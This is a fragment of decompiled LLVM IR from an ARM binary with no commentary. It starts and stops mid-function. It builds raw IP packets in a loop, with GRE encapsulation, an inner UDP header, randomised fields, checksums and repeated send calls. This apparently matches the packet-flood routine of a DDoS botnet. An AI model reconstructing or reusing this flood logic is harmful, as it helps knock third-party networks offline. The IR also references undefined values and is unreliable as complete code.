  %v5_af28 = mul i32 %v2_af28, 4
  %v6_af28 = add i32 %v5_af28, %v2_acc4
  %v7_af28 = inttoptr i32 %v6_af28 to i32*
  store i32 %v2_af1c, i32* %v7_af28, align 4
  %v0_af2c = load i32, i32* %r2.global-to-local, align 4
  %v1_af2c = load i32, i32* %r3.global-to-local, align 4
  %v4_af2c = mul i32 %v1_af2c, 4
  %v5_af2c = add i32 %v4_af2c, %v0_af2c
  %v6_af2c = inttoptr i32 %v5_af2c to i32*
  %v7_af2c = load i32, i32* %v6_af2c, align 4
  store i32 %v7_af2c, i32* %r4.global-to-local, align 4
  %v1_af30 = inttoptr i32 %v7_af2c to i8*
  %v2_af30 = load i8, i8* %v1_af30, align 1
  %tmp = urem i8 %v2_af30, 16
  %v1_af34 = zext i8 %tmp to i32
  %v1_af38 = or i32 %v1_af34, 64
  store i32 %v1_af38, i32* %r2.global-to-local, align 4
  %v1_af3c = trunc i32 %v1_af38 to i8
  store i8 %v1_af3c, i8* %v1_af30, align 1
  %v0_af40 = load i32, i32* %r3.global-to-local, align 4
  %v5_af44 = mul i32 %v0_af40, 24
  store i32 %v5_af44, i32* %r1.global-to-local, align 4
  %v0_af48 = load i32, i32* %r4.global-to-local, align 4
  %v1_af48 = inttoptr i32 %v0_af48 to i8*
  %v2_af48 = load i8, i8* %v1_af48, align 1
  %v1_af4c = and i8 %v2_af48, -16
  %v1_af50 = or i8 %v1_af4c, 5
  store i32 %v1_ad44, i32* %r5.global-to-local, align 4
  store i8 %v1_af50, i8* %v1_af48, align 1
  store i32 %v4_af5c, i32* %r2.global-to-local, align 4
  %v2_af60 = load i32, i32* %r4.global-to-local, align 4
  %v3_af60 = add i32 %v2_af60, 1
  %v4_af60 = inttoptr i32 %v3_af60 to i8*
  store i8 %v5_acfc, i8* %v4_af60, align 1
  store i32 %v1_ad20, i32* %r3.global-to-local, align 4
  %v0_af68 = load i32, i32* %r5.global-to-local, align 4
  %v2_af68 = icmp eq i32 %v0_af68, 0
  store i1 %v2_af68, i1* %cpsr_z.global-to-local, align 1
  %v2_af6c = load i32, i32* %r4.global-to-local, align 4
  %v3_af6c = add i32 %v2_af6c, 8
  %v4_af6c = inttoptr i32 %v3_af6c to i8*
  store i8 %v1_af6c, i8* %v4_af6c, align 1
  %v0_af70 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_af70, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_af10
  store i32 %v4_af7413, i32* %r5.global-to-local, align 4
  br label %bb77

bb:                                               ; preds = %dec_label_pc_af10
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v4_af7413, i32* %r5.global-to-local, align 4
  %v3_af78 = load i32, i32* %r4.global-to-local, align 4
  %v4_af78 = add i32 %v3_af78, 6
  %v5_af78 = inttoptr i32 %v4_af78 to i16*
  store i16 64, i16* %v5_af78, align 2
  br label %bb77

bb77:                                             ; preds = %.thread, %bb
  %v2_af80 = load i32, i32* %r4.global-to-local, align 4
  %v3_af80 = add i32 %v2_af80, 9
  %v4_af80 = inttoptr i32 %v3_af80 to i8*
  store i8 47, i8* %v4_af80, align 1
  %v0_af84 = load i32, i32* %r4.global-to-local, align 4
  %v1_af84 = add i32 %v0_af84, 20
  store i32 %v1_af84, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v0_af8c = load i32, i32* %r5.global-to-local, align 4
  %v1_af8c = trunc i32 %v0_af8c to i16
  %v3_af8c = add i32 %v0_af84, 4
  %v4_af8c = inttoptr i32 %v3_af8c to i16*
  store i16 %v1_af8c, i16* %v4_af8c, align 2
  %v0_af90 = load i32, i32* @r8, align 4
  %v1_af90 = trunc i32 %v0_af90 to i16
  %v2_af90 = load i32, i32* %r4.global-to-local, align 4
  %v3_af90 = add i32 %v2_af90, 2
  %v4_af90 = inttoptr i32 %v3_af90 to i16*
  store i16 %v1_af90, i16* %v4_af90, align 2
  %v0_af94 = load i32, i32* %r3.global-to-local, align 4
  %v1_af94 = trunc i32 %v0_af94 to i16
  %v2_af94 = load i32, i32* %r2.global-to-local, align 4
  %v3_af94 = add i32 %v2_af94, 2
  %v4_af94 = inttoptr i32 %v3_af94 to i16*
  store i16 %v1_af94, i16* %v4_af94, align 2
  store i32 %v5_ade4, i32* %r3.global-to-local, align 4
  %v0_af9c = load i32, i32* %r4.global-to-local, align 4
  %v1_af9c = add i32 %v0_af9c, 24
  %v2_af9c = inttoptr i32 %v1_af9c to i8*
  %v3_af9c = load i8, i8* %v2_af9c, align 1
  %v4_af9c = zext i8 %v3_af9c to i32
  store i32 %v4_af9c, i32* %r2.global-to-local, align 4
  %v2_afa0 = add i32 %v0_af9c, 12
  %v3_afa0 = inttoptr i32 %v2_afa0 to i32*
  store i32 %v5_ade4, i32* %v3_afa0, align 4
  %v0_afa4 = load i32, i32* %r2.global-to-local, align 4
  %v1_afa4 = and i32 %v0_afa4, -241
  %v1_afa8 = or i32 %v1_afa4, 64
  store i32 %v1_afa8, i32* %r2.global-to-local, align 4
  %v0_afac = load i32, i32* %r1.global-to-local, align 4
  %v1_afac = load i32, i32* @sb, align 4
  %v2_afac = add i32 %v1_afac, %v0_afac
  store i32 %v2_afac, i32* %r1.global-to-local, align 4
  %v1_afb0 = add i32 %v2_afac, 16
  %v2_afb0 = inttoptr i32 %v1_afb0 to i32*
  %v3_afb0 = load i32, i32* %v2_afb0, align 4
  store i32 %v3_afb0, i32* %r1.global-to-local, align 4
  %v1_afb4 = trunc i32 %v1_afa8 to i8
  %v2_afb4 = load i32, i32* %r4.global-to-local, align 4
  %v3_afb4 = add i32 %v2_afb4, 24
  %v4_afb4 = inttoptr i32 %v3_afb4 to i8*
  store i8 %v1_afb4, i8* %v4_afb4, align 1
  %v0_afb8 = load i32, i32* %r4.global-to-local, align 4
  %v1_afb8 = add i32 %v0_afb8, 24
  %v2_afb8 = inttoptr i32 %v1_afb8 to i8*
  %v3_afb8 = load i8, i8* %v2_afb8, align 1
  %v1_afbc = and i8 %v3_afb8, -16
  %v1_afc0 = or i8 %v1_afbc, 5
  store i8 %v1_afc0, i8* %v2_afb8, align 1
  %v0_afc8 = load i32, i32* %r1.global-to-local, align 4
  %v1_afc8 = load i32, i32* %r4.global-to-local, align 4
  %v2_afc8 = add i32 %v1_afc8, 16
  %v3_afc8 = inttoptr i32 %v2_afc8 to i32*
  store i32 %v0_afc8, i32* %v3_afc8, align 4
  %v0_afd0 = load i32, i32* %r4.global-to-local, align 4
  %v1_afd0 = add i32 %v0_afd0, 24
  store i32 %v1_afd0, i32* @r5, align 4
  %v3_afd4 = add i32 %v0_afd0, 25
  %v4_afd4 = inttoptr i32 %v3_afd4 to i8*
  store i8 %v5_acfc, i8* %v4_afd4, align 1
  store i32 %v4_afd8, i32* %r2.global-to-local, align 4
  store i32 %v4_afdc, i32* %r3.global-to-local, align 4
  store i32 %v1_ad20, i32* %r1.global-to-local, align 4
  %v2_afe4 = load i32, i32* @r5, align 4
  %v3_afe4 = add i32 %v2_afe4, 2
  %v4_afe4 = inttoptr i32 %v3_afe4 to i16*
  store i16 %v1_afe4, i16* %v4_afe4, align 2
  %v0_afe8 = load i32, i32* %r3.global-to-local, align 4
  %v1_afe8 = trunc i32 %v0_afe8 to i16
  %v2_afe8 = load i32, i32* @r5, align 4
  %v3_afe8 = add i32 %v2_afe8, 4
  %v4_afe8 = inttoptr i32 %v3_afe8 to i16*
  store i16 %v1_afe8, i16* %v4_afe8, align 2
  %v0_afec = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_afec, label %bb79, label %bb78

bb78:                                             ; preds = %bb77
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %bb77, %bb78
  store i32 17, i32* %r3.global-to-local, align 4
  %v0_aff4 = load i32, i32* %r1.global-to-local, align 4
  %v1_aff4 = trunc i32 %v0_aff4 to i8
  %v2_aff4 = load i32, i32* @r5, align 4
  %v3_aff4 = add i32 %v2_aff4, 8
  %v4_aff4 = inttoptr i32 %v3_aff4 to i8*
  store i8 %v1_aff4, i8* %v4_aff4, align 1
  %v0_aff8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_aff8, label %bb81, label %bb80

bb80:                                             ; preds = %bb79
  %v1_aff8 = load i32, i32* %r2.global-to-local, align 4
  %v2_aff8 = trunc i32 %v1_aff8 to i16
  %v3_aff8 = load i32, i32* @r5, align 4
  %v4_aff8 = add i32 %v3_aff8, 6
  %v5_aff8 = inttoptr i32 %v4_aff8 to i16*
  store i16 %v2_aff8, i16* %v5_aff8, align 2
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v0_affc = load i32, i32* %r3.global-to-local, align 4
  %v1_affc = trunc i32 %v0_affc to i8
  %v2_affc = load i32, i32* @r5, align 4
  %v3_affc = add i32 %v2_affc, 9
  %v4_affc = inttoptr i32 %v3_affc to i8*
  store i8 %v1_affc, i8* %v4_affc, align 1
  %v0_b000 = call i32 @function_e7dc()
  store i32 %v1_ae3c, i32* %r1.global-to-local, align 4
  store i1 %v2_b00c, i1* %cpsr_z.global-to-local, align 1
  %v1_b010 = sub i32 1023, %v0_b000
  store i32 %v1_b010, i32* %r3.global-to-local, align 4
  br i1 %v2_b00c, label %.thread14, label %.thread15

.thread14:                                        ; preds = %bb81
  %v2_b018 = load i32, i32* @r5, align 4
  %v3_b018 = add i32 %v2_b018, 16
  %v4_b018 = inttoptr i32 %v3_b018 to i32*
  store i32 %v1_b010, i32* %v4_b018, align 4
  br label %bb82

.thread15:                                        ; preds = %bb81
  %v1_b014 = load i32, i32* %r4.global-to-local, align 4
  %v2_b014 = add i32 %v1_b014, 16
  %v3_b014 = inttoptr i32 %v2_b014 to i32*
  %v4_b014 = load i32, i32* %v3_b014, align 4
  store i32 %v4_b014, i32* %r3.global-to-local, align 4
  %v2_b01c = load i32, i32* @r5, align 4
  %v3_b01c = add i32 %v2_b01c, 16
  %v4_b01c = inttoptr i32 %v3_b01c to i32*
  store i32 %v4_b014, i32* %v4_b01c, align 4
  br label %bb82

bb82:                                             ; preds = %.thread14, %.thread15
  %v1_b020 = load i32, i32* @r5, align 4
  %v2_b020 = add i32 %v1_b020, 12
  %v3_b020 = inttoptr i32 %v2_b020 to i32*
  store i32 %v0_b000, i32* %v3_b020, align 4
  %v3_b024 = load i32, i32* %stack_var_-44, align 4
  %v0_b028 = load i32, i32* %r4.global-to-local, align 4
  %v1_b028 = add i32 %v0_b028, 44
  store i32 %v1_b028, i32* @r6, align 4
  store i32 %v4_b02c, i32* %r2.global-to-local, align 4
  %v1_b030 = add i32 %v3_b024, 1
  store i32 %v1_b030, i32* @r4, align 4
  store i32 %v4_b034, i32* %r3.global-to-local, align 4
  %v1_b038 = load i32, i32* @sl, align 4
  %v9_b038 = icmp eq i32 %v1_b030, %v1_b038
  store i1 %v9_b038, i1* %cpsr_z.global-to-local, align 1
  %v0_b03c = load i32, i32* @r7, align 4
  %v1_b03c = trunc i32 %v0_b03c to i16
  %v3_b03c = add i32 %v0_b028, 48
  %v4_b03c = inttoptr i32 %v3_b03c to i16*
  store i16 %v1_b03c, i16* %v4_b03c, align 2
  %v0_b040 = load i32, i32* %r2.global-to-local, align 4
  %v1_b040 = trunc i32 %v0_b040 to i16
  %v2_b040 = load i32, i32* @r6, align 4
  %v3_b040 = inttoptr i32 %v2_b040 to i16*
  store i16 %v1_b040, i16* %v3_b040, align 2
  %v0_b044 = load i32, i32* %r3.global-to-local, align 4
  %v1_b044 = trunc i32 %v0_b044 to i16
  %v2_b044 = load i32, i32* @r6, align 4
  %v3_b044 = add i32 %v2_b044, 2
  %v4_b044 = inttoptr i32 %v3_b044 to i16*
  store i16 %v1_b044, i16* %v4_b044, align 2
  %v0_b048 = load i32, i32* @r4, align 4
  store i32 %v0_b048, i32* %stack_var_-44, align 4
  %v5_b04c = icmp slt i32 %v1_b030, %v1_b038
  br i1 %v5_b04c, label %dec_label_pc_af10, label %dec_label_pc_b050

dec_label_pc_b050:                                ; preds = %bb82
  store i32 %v5_ad90, i32* %r5.global-to-local, align 4
  %v1_b058 = add i32 %v5_ad90, 8
  store i32 %v1_b058, i32* %r4.global-to-local, align 4
  %v0_b068.pre.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_b064.preheader

dec_label_pc_b064.preheader:                      ; preds = %dec_label_pc_b050, %dec_label_pc_b2a8
  %v0_b068.pre = phi i32 [ %v0_b068.pre.pre, %dec_label_pc_b050 ], [ 0, %dec_label_pc_b2a8 ]
  %stack_var_-124.0.ph = phi i32 [ %v1_b058, %dec_label_pc_b050 ], [ %v1_b2b0, %dec_label_pc_b2a8 ]
  %storemerge = add i32 %v5_ad90, 52
  store i32 %storemerge, i32* @r8, align 4
  %v2_b25c = icmp eq i32 %v1_ae3c, 0
  %v2_b278 = icmp eq i32 %v1_adb0, 0
  %v2_b0a4 = icmp eq i32 %v5_ade4, -1
  %v7_b0a4 = icmp eq i32 %v5_ade4, -1
  br label %dec_label_pc_b064

dec_label_pc_b064:                                ; preds = %dec_label_pc_b064, %dec_label_pc_b0f4, %dec_label_pc_b064.preheader
  %v0_b068 = phi i32 [ %v0_b068.pre, %dec_label_pc_b064.preheader ], [ 0, %dec_label_pc_b064 ], [ %v1_b190, %dec_label_pc_b0f4 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b068 = icmp eq i32 %v0_b068, 0
  store i1 %v2_b068, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b068, label %dec_label_pc_b064, label %dec_label_pc_b074

dec_label_pc_b074:                                ; preds = %dec_label_pc_b064
  br label %dec_label_pc_b078

dec_label_pc_b078:                                ; preds = %dec_label_pc_b0f4, %dec_label_pc_b074
  %v1_b08c = phi i32 [ %v1_b18c, %dec_label_pc_b0f4 ], [ 0, %dec_label_pc_b074 ]
  %v5_b07c = mul i32 %v1_b08c, 24
  %v1_b080 = load i32, i32* @sb, align 4
  %v2_b080 = add i32 %v1_b080, %v5_b07c
  store i32 %v2_b080, i32* %r3.global-to-local, align 4
  store i32 %v2_acc4, i32* %r4.global-to-local, align 4
  %v1_b088 = add i32 %v2_b080, 20
  %v2_b088 = inttoptr i32 %v1_b088 to i8*
  %v3_b088 = load i8, i8* %v2_b088, align 1
  %v4_b088 = zext i8 %v3_b088 to i32
  store i32 %v4_b088, i32* %r2.global-to-local, align 4
  %v4_b08c = mul i32 %v1_b08c, 4
  %v5_b08c = add i32 %v4_b08c, %v2_acc4
  %v6_b08c = inttoptr i32 %v5_b08c to i32*
  %v7_b08c = load i32, i32* %v6_b08c, align 4
  store i32 %v7_b08c, i32* @r5, align 4
  %v7_b090 = icmp eq i8 %v3_b088, 31
  store i1 %v7_b090, i1* %cpsr_z.global-to-local, align 1
  %v1_b094 = add i32 %v7_b08c, 24
  store i32 %v1_b094, i32* @r6, align 4
  %v1_b098 = add i32 %v7_b08c, 44
  store i32 %v1_b098, i32* @r7, align 4
  %tmp86 = icmp ult i8 %v3_b088, 32
  br i1 %tmp86, label %dec_label_pc_b1a0, label %dec_label_pc_b0a0

dec_label_pc_b0a0:                                ; preds = %dec_label_pc_b078
  store i32 %v5_ade4, i32* %r1.global-to-local, align 4
  store i1 %v7_b0a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b0a4, label %dec_label_pc_b200, label %dec_label_pc_b0ac

dec_label_pc_b0ac:                                ; preds = %dec_label_pc_b1a0, %dec_label_pc_b0a0
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_b0b4 = load i32, i32* @fp, align 4
  %v9_b0b4 = icmp eq i32 %v0_b0b4, 65535
  store i1 %v9_b0b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b0b4, label %dec_label_pc_b218, label %dec_label_pc_b0bc

dec_label_pc_b0bc:                                ; preds = %dec_label_pc_b200.dec_label_pc_b0bc_crit_edge, %dec_label_pc_b0ac
  %v1_b0c0 = phi i32 [ %v1_b0c0.pre, %dec_label_pc_b200.dec_label_pc_b0bc_crit_edge ], [ 65535, %dec_label_pc_b0ac ]
  store i32 %v3_ae44, i32* %r2.global-to-local, align 4
  %v9_b0c0 = icmp eq i32 %v3_ae44, %v1_b0c0
  store i1 %v9_b0c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b0c0, label %dec_label_pc_b240, label %dec_label_pc_b0c8

dec_label_pc_b0c8:                                ; preds = %dec_label_pc_b218.dec_label_pc_b0c8_crit_edge, %dec_label_pc_b0bc
  %v1_b0cc = phi i32 [ %v1_b0cc.pre, %dec_label_pc_b218.dec_label_pc_b0c8_crit_edge ], [ %v1_b0c0, %dec_label_pc_b0bc ]
  store i32 %v3_ae48, i32* %r3.global-to-local, align 4
  %v9_b0cc = icmp eq i32 %v3_ae48, %v1_b0cc
  store i1 %v9_b0cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b0cc, label %dec_label_pc_b254, label %dec_label_pc_b0d4

dec_label_pc_b0d4:                                ; preds = %dec_label_pc_b240, %dec_label_pc_b0c8
  store i32 %v1_ae3c, i32* @r4, align 4
  store i1 %v2_b25c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b25c, label %dec_label_pc_b270, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_b0d4
  %v1_b0dc = load i32, i32* @r5, align 4
  %v2_b0dc = add i32 %v1_b0dc, 16
  %v3_b0dc = inttoptr i32 %v2_b0dc to i32*
  %v4_b0dc = load i32, i32* %v3_b0dc, align 4
  store i32 %v4_b0dc, i32* %r3.global-to-local, align 4
  %v2_b0e0 = load i32, i32* @r6, align 4
  %v3_b0e0 = add i32 %v2_b0e0, 16
  %v4_b0e0 = inttoptr i32 %v3_b0e0 to i32*
  store i32 %v4_b0dc, i32* %v4_b0e0, align 4
  br label %dec_label_pc_b0e8

dec_label_pc_b0e8:                                ; preds = %bb85, %.thread16
  store i32 %v1_adb0, i32* %r1.global-to-local, align 4
  store i1 %v2_b278, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b278, label %dec_label_pc_b0f4, label %dec_label_pc_b284

dec_label_pc_b0f4:                                ; preds = %dec_label_pc_b0e8, %dec_label_pc_b270, %dec_label_pc_b284
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_b0f8 = load i32, i32* @r5, align 4
  %v3_b0f8 = add i32 %v2_b0f8, 10
  %v4_b0f8 = inttoptr i32 %v3_b0f8 to i16*
  store i16 0, i16* %v4_b0f8, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_b100 = load i32, i32* @r5, align 4
  store i32 %v0_b100, i32* @r0, align 4
  %v2_b104 = call i32 @function_cef4(i32 %v0_b100, i32 20)
  %v3_b104 = trunc i32 %v2_b104 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_b10c = load i32, i32* @r5, align 4
  %v4_b10c = add i32 %v3_b10c, 10
  %v5_b10c = inttoptr i32 %v4_b10c to i16*
  store i16 %v3_b104, i16* %v5_b10c, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_b114 = load i32, i32* %r3.global-to-local, align 4
  %v1_b114 = trunc i32 %v0_b114 to i16
  %v2_b114 = load i32, i32* @r6, align 4
  %v3_b114 = add i32 %v2_b114, 10
  %v4_b114 = inttoptr i32 %v3_b114 to i16*
  store i16 %v1_b114, i16* %v4_b114, align 2
  %v0_b118 = load i32, i32* @r6, align 4
  store i32 %v0_b118, i32* @r0, align 4
  %v2_b11c = call i32 @function_cef4(i32 %v0_b118, i32 20)
  %v3_b11c = trunc i32 %v2_b11c to i16
  %v3_b120 = load i32, i32* @r6, align 4
  %v4_b120 = add i32 %v3_b120, 10
  %v5_b120 = inttoptr i32 %v4_b120 to i16*
  store i16 %v3_b11c, i16* %v5_b120, align 2
  store i32 0, i32* @r4, align 4
  %v0_b128 = load i32, i32* @r7, align 4
  store i32 %v0_b128, i32* @r1, align 4
  %v1_b12c = add i32 %v0_b128, 4
  %v2_b12c = inttoptr i32 %v1_b12c to i16*
  %v3_b12c = load i16, i16* %v2_b12c, align 2
  %v4_b12c = zext i16 %v3_b12c to i32
  store i32 %v4_b12c, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-124.0.ph, i32* %r3.global-to-local, align 4
  %v3_b134 = add i32 %v0_b128, 6
  %v4_b134 = inttoptr i32 %v3_b134 to i16*
  store i16 0, i16* %v4_b134, align 2
  %v0_b138 = load i32, i32* @r6, align 4
  %v4_b13c = call i32 @function_cf44(i32 %v0_b138, i32 %v0_b128, i32 %v4_b12c, i32 %stack_var_-124.0.ph)
  %v5_b13c = trunc i32 %v4_b13c to i16
  %v3_b140 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b140, i32* %r2.global-to-local, align 4
  %v3_b144 = mul i32 %v3_b140, 32
  store i32 %v3_b144, i32* %r3.global-to-local, align 4
  %v0_b148 = load i32, i32* @r5, align 4
  %v1_b148 = add i32 %v0_b148, 16
  %v2_b148 = inttoptr i32 %v1_b148 to i32*
  %v3_b148 = load i32, i32* %v2_b148, align 4
  %v5_b14c = mul i32 %v3_b140, 24
  store i32 %v5_b14c, i32* %r3.global-to-local, align 4
  %v1_b150 = load i32, i32* @sb, align 4
  %v2_b150 = add i32 %v1_b150, %v5_b14c
  store i32 %v2_b150, i32* @lr, align 4
  %v2_b154 = add i32 %v2_b150, 4
  %v3_b154 = inttoptr i32 %v2_b154 to i32*
  store i32 %v3_b148, i32* %v3_b154, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_b15c = load i32, i32* @r7, align 4
  %v4_b15c = add i32 %v3_b15c, 6
  %v5_b15c = inttoptr i32 %v4_b15c to i16*
  store i16 %v5_b13c, i16* %v5_b15c, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_b164 = load i32, i32* %r1.global-to-local, align 4
  %v1_b164 = trunc i32 %v0_b164 to i16
  %v2_b164 = load i32, i32* %r3.global-to-local, align 4
  %v3_b164 = load i32, i32* @sb, align 4
  %v4_b164 = add i32 %v3_b164, %v2_b164
  %v5_b164 = inttoptr i32 %v4_b164 to i16*
  store i16 %v1_b164, i16* %v5_b164, align 2
  %v0_b168 = load i32, i32* @r4, align 4
  %v1_b168 = trunc i32 %v0_b168 to i16
  %v2_b168 = load i32, i32* @lr, align 4
  %v3_b168 = add i32 %v2_b168, 2
  %v4_b168 = inttoptr i32 %v3_b168 to i16*
  store i16 %v1_b168, i16* %v4_b168, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_b170 = load i32, i32* @r5, align 4
  store i32 %v0_b170, i32* %r1.global-to-local, align 4
  %v0_b178 = load i32, i32* @r8, align 4
  store i32 %v0_b178, i32* %r2.global-to-local, align 4
  %v0_b17c = load i32, i32* @lr, align 4
  %v0_b180 = load i32, i32* %ip.global-to-local, align 4
  %v6_b184 = call i32 @function_10d6c(i32 %v3_adf8, i32 %v0_b170, i32 %v0_b178, i32 16384, i32 %v0_b17c, i32 %v0_b180)
  %v3_b188 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b188, i32* %r3.global-to-local, align 4
  %v1_b18c = add i32 %v3_b188, 1
  %v1_b190 = load i32, i32* @sl, align 4
  %v9_b190 = icmp eq i32 %v1_b18c, %v1_b190
  store i1 %v9_b190, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_b18c, i32* %stack_var_-44, align 4
  %v6_b198 = icmp slt i32 %v1_b18c, %v1_b190
  br i1 %v6_b198, label %dec_label_pc_b078, label %dec_label_pc_b064

dec_label_pc_b1a0:                                ; preds = %dec_label_pc_b078
  %v1_b1a0 = add i32 %v2_b080, 16
  %v2_b1a0 = inttoptr i32 %v1_b1a0 to i32*
  %v3_b1a0 = load i32, i32* %v2_b1a0, align 4
  store i32 %v3_b1a0, i32* %r4.global-to-local, align 4
  %v0_b1a4 = call i32 @function_e7dc()
  %v3_b1a8 = load i32, i32* %stack_var_-44, align 4
  %v5_b1b0 = mul i32 %v3_b1a8, 24
  %v0_b1b4 = load i32, i32* %r4.global-to-local, align 4
  %v1_b1b4 = and i32 %v0_b1b4, 16711680
  store i32 %v1_b1b4, i32* %ip.global-to-local, align 4
  %v3_b1b8 = udiv i32 %v0_b1b4, 16777216
  %v4_b1bc = udiv i32 %v1_b1b4, 256
  %v5_b1bc = or i32 %v4_b1bc, %v3_b1b8
  store i32 %v5_b1bc, i32* %r2.global-to-local, align 4
  %v1_b1c0 = load i32, i32* @sb, align 4
  %v2_b1c0 = add i32 %v1_b1c0, %v5_b1b0
  store i32 %v2_b1c0, i32* %r1.global-to-local, align 4
  %v1_b1c4 = and i32 %v0_b1b4, 65280
  store i32 %v1_b1c4, i32* %r3.global-to-local, align 4
  %v1_b1c8 = add i32 %v2_b1c0, 20
  %v2_b1c8 = inttoptr i32 %v1_b1c8 to i8*
  %v3_b1c8 = load i8, i8* %v2_b1c8, align 1
  %v4_b1c8 = zext i8 %v3_b1c8 to i32
  store i32 %v4_b1c8, i32* %ip.global-to-local, align 4
  %v5_b1d0 = call i32 @llvm.bswap.i32(i32 %v0_b1b4)
  %v7_b1d4 = lshr i32 %v0_b1a4, %v4_b1c8
  %v8_b1d4 = add i32 %v7_b1d4, %v5_b1d0
  store i32 %v8_b1d4, i32* %r2.global-to-local, align 4
  store i32 %v5_ade4, i32* %r1.global-to-local, align 4
  %v5_b1f0 = call i32 @llvm.bswap.i32(i32 %v8_b1d4)
  store i32 %v5_b1f0, i32* %r3.global-to-local, align 4
  store i1 %v7_b0a4, i1* %cpsr_z.global-to-local, align 1
  %v1_b1f8 = load i32, i32* @r5, align 4
  %v2_b1f8 = add i32 %v1_b1f8, 16
  %v3_b1f8 = inttoptr i32 %v2_b1f8 to i32*
  store i32 %v5_b1f0, i32* %v3_b1f8, align 4
  br i1 %v2_b0a4, label %dec_label_pc_b200, label %dec_label_pc_b0ac

dec_label_pc_b200:                                ; preds = %dec_label_pc_b1a0, %dec_label_pc_b0a0
  %v0_b200 = call i32 @function_e7dc()
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_b20c = load i32, i32* @fp, align 4
  %v9_b20c = icmp eq i32 %v0_b20c, 65535
  store i1 %v9_b20c, i1* %cpsr_z.global-to-local, align 1
  %v1_b210 = load i32, i32* @r5, align 4
  %v2_b210 = add i32 %v1_b210, 12
  %v3_b210 = inttoptr i32 %v2_b210 to i32*
  store i32 %v0_b200, i32* %v3_b210, align 4
  br i1 %v9_b20c, label %dec_label_pc_b218, label %dec_label_pc_b200.dec_label_pc_b0bc_crit_edge

dec_label_pc_b200.dec_label_pc_b0bc_crit_edge:    ; preds = %dec_label_pc_b200
  %v1_b0c0.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_b0bc

dec_label_pc_b218:                                ; preds = %dec_label_pc_b200, %dec_label_pc_b0ac
  %v0_b218 = call i32 @function_e7dc()
  %v3_b220 = urem i32 %v0_b218, 65536
  store i32 %v3_ae44, i32* %r2.global-to-local, align 4
  %v1_b22c = sub nsw i32 999, %v3_b220
  store i32 %v1_b22c, i32* %r3.global-to-local, align 4
  %v1_b230 = load i32, i32* %r4.global-to-local, align 4
  %v9_b230 = icmp eq i32 %v3_ae44, %v1_b230
  store i1 %v9_b230, i1* %cpsr_z.global-to-local, align 1
  %v1_b234 = trunc i32 %v0_b218 to i16
  %v2_b234 = load i32, i32* @r5, align 4
  %v3_b234 = add i32 %v2_b234, 4
  %v4_b234 = inttoptr i32 %v3_b234 to i16*
  store i16 %v1_b234, i16* %v4_b234, align 2
  %v0_b238 = load i32, i32* %r3.global-to-local, align 4
  %v1_b238 = trunc i32 %v0_b238 to i16
  %v2_b238 = load i32, i32* @r6, align 4
  %v3_b238 = add i32 %v2_b238, 4
  %v4_b238 = inttoptr i32 %v3_b238 to i16*
  store i16 %v1_b238, i16* %v4_b238, align 2
  br i1 %v9_b230, label %dec_label_pc_b240, label %dec_label_pc_b218.dec_label_pc_b0c8_crit_edge

dec_label_pc_b218.dec_label_pc_b0c8_crit_edge:    ; preds = %dec_label_pc_b218
  %v1_b0cc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_b0c8

dec_label_pc_b240:                                ; preds = %dec_label_pc_b218, %dec_label_pc_b0bc
  %v0_b240 = call i32 @function_e7dc()
  %v1_b240 = trunc i32 %v0_b240 to i16
  store i32 %v3_ae48, i32* %r3.global-to-local, align 4
  %v1_b248 = load i32, i32* %r4.global-to-local, align 4
  %v9_b248 = icmp eq i32 %v3_ae48, %v1_b248
  store i1 %v9_b248, i1* %cpsr_z.global-to-local, align 1
  %v3_b24c = load i32, i32* @r5, align 4
  %v4_b24c = add i32 %v3_b24c, 44
  %v5_b24c = inttoptr i32 %v4_b24c to i16*
  store i16 %v1_b240, i16* %v5_b24c, align 2
  br i1 %v9_b248, label %dec_label_pc_b254, label %dec_label_pc_b0d4

dec_label_pc_b254:                                ; preds = %dec_label_pc_b240, %dec_label_pc_b0c8
  %v0_b254 = call i32 @function_e7dc()
  %v1_b254 = trunc i32 %v0_b254 to i16
  store i32 %v1_ae3c, i32* @r4, align 4
  store i1 %v2_b25c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b25c, label %.thread30, label %bb85

.thread30:                                        ; preds = %dec_label_pc_b254
  %v3_b26431 = load i32, i32* @r7, align 4
  %v4_b26432 = add i32 %v3_b26431, 2
  %v5_b26433 = inttoptr i32 %v4_b26432 to i16*
  store i16 %v1_b254, i16* %v5_b26433, align 2
  br label %dec_label_pc_b270

bb85:                                             ; preds = %dec_label_pc_b254
  %v1_b260 = load i32, i32* @r5, align 4
  %v2_b260 = add i32 %v1_b260, 16
  %v3_b260 = inttoptr i32 %v2_b260 to i32*
